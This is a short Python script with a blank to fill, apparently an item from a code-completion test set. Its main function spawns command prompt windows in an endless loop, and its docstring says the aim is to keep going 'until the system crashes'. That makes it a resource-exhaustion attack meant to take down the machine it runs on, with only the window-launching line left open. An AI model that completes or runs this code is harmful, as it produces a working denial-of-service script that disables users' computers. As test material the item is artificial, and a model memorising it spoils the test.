import subprocess
import time

def open_command_prompt():
    <FILL_HERE>
def main():
    """
    Main function to continuously open command prompt windows until the system crashes.
    """
    try:
        while True:
            open_command_prompt()
            # Add a small delay to avoid overwhelming the system too quickly
            time.sleep(0.1)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()